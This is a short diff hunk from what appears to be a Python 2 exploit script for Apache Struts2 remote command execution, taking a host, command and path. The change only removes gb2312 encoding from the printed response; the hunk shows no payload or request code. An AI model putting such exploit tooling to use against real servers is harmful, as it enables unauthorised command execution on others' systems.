@@ -15,10 +15,10 @@ def expliot(host, command, path):
 
 	if res.status_code == 200 and res1.status_code != 200:
 		print "Exploit successful:"
-		print res.content.encode('gb2312')
+		print res.content
 	elif res1.status_code == 200 and res.status_code != 200:
 		print "Exploit successful:"
-		print res1.content.decode('gb2312')
+		print res1.content
 	else:
 		print('The target is likely unvulnerable,mabye your struts2 version is too high!')
 
